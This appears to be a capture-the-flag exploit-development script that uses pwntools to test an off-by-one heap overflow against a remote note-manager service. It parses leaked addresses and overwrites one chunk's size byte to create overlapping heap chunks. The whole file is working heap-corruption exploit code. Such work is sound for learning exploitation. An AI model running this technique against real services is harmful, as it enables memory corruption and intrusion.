#!/usr/bin/env python3
"""Step 2: Test off-by-one vulnerability"""
from pwn import *

io = remote('212.2.250.33', 32384)

banner = io.recvuntil(b'>')
import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

print("="*60)
print("STEP 2: TEST OFF-BY-ONE")
print("="*60)
print(f"heap:  0x{heap:x}")
print(f"win(): 0x{win:x}")
print(f"hook:  0x{hook:x}")

# Create note 0 - fill it completely
print("\n[1] Creating note 0 with 24 bytes (fills chunk completely)")
io.sendline(b'1')
io.recvuntil(b':')
io.sendline(b'24')
io.recvuntil(b':')
io.sendline(b'A' * 24)
response = io.recvuntil(b'>')
print(response.decode())

# Create note 1 - this is our victim
print("\n[2] Creating note 1 (victim)")
io.sendline(b'1')
io.recvuntil(b':')
io.sendline(b'24')
io.recvuntil(b':')
io.sendline(b'B' * 24)
response = io.recvuntil(b'>')
print(response.decode())

# Create note 2 - barrier to prevent consolidation with top chunk
print("\n[3] Creating note 2 (barrier)")
io.sendline(b'1')
io.recvuntil(b':')
io.sendline(b'24')
io.recvuntil(b':')
io.sendline(b'C' * 24)
response = io.recvuntil(b'>')
print(response.decode())

# Now the off-by-one: edit note 0 and append 1 byte
# This will overflow into note 1's metadata
print("\n[4] Triggering off-by-one: appending 1 byte to note 0")
print("    This should overwrite note 1's size field")
io.sendline(b'2')
io.recvuntil(b':')
io.sendline(b'0')
io.recvuntil(b':')
# Append exactly 1 byte - this overwrites the LSB of note 1's size
io.sendline(b'\x91')  # Change size from 0x21 to 0x91
response = io.recvuntil(b'>')
print(response.decode())

# Print note 0 to see the overflow
print("\n[5] Printing note 0 after edit")
io.sendline(b'4')
io.recvuntil(b':')
io.sendline(b'0')
response = io.recvuntil(b'>')
print(response.decode())

# Now free note 1 - it thinks it's 0x90 bytes instead of 0x20
print("\n[6] Freeing note 1 (with corrupted size)")
io.sendline(b'3')
io.recvuntil(b':')
io.sendline(b'1')
response = io.recvuntil(b'>')
print(response.decode())

# Allocate a smaller chunk - this creates overlap!
print("\n[7] Allocating smaller chunk (creates overlap)")
io.sendline(b'1')
io.recvuntil(b':')
io.sendline(b'16')
io.recvuntil(b':')
io.sendline(b'D' * 16)
response = io.recvuntil(b'>')
print(response.decode())

# Print note 2 - if overlap worked, it might be corrupted
print("\n[8] Printing note 2 (should show if overlap worked)")
io.sendline(b'4')
io.recvuntil(b':')
io.sendline(b'2')
response = io.recvuntil(b'>')
print(response.decode())

io.close()

print("\n" + "="*60)
print("OFF-BY-ONE TEST COMPLETE")
print("="*60)
